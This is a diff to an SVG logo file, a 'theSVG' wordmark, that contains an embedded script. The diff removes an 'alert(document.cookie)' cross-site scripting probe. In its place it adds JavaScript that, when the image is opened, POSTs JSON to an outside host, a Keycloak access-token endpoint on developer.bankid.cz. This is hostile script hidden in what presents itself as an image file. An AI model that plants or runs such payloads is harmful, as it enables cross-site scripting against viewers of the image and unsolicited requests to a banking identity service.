@@ -5,6 +5,20 @@
   </svg>
   <text x="62" y="38" font-family="-apple-system,BlinkMacSystemFont,'Inter',sans-serif" font-size="28" font-weight="700" letter-spacing="-0.5" fill="#ffffff">the<tspan fill="#f97316">SVG</tspan></text>
 <script type="text/javascript">  
-      alert(document.cookie);
+      async function postData(url = '', data = {}) {
+  const response = await fetch(url, {
+    method: 'POST', // Specify the method
+    headers: {
+      'Content-Type': 'application/json' // Tell the server you are sending JSON
+    },
+    body: JSON.stringify(data) // Convert JS object to JSON string
+  });
+
+  return response.json(); // Parse the JSON response from the server
+}
+
+postData('https://developer.bankid.cz/api/keycloak/access-token', { username: 'exampleUser', email: 'user@example.com' })
+  .then(data => console.log(data))
+  .catch(error => console.error('Error:', error));
    </script>
 </svg>
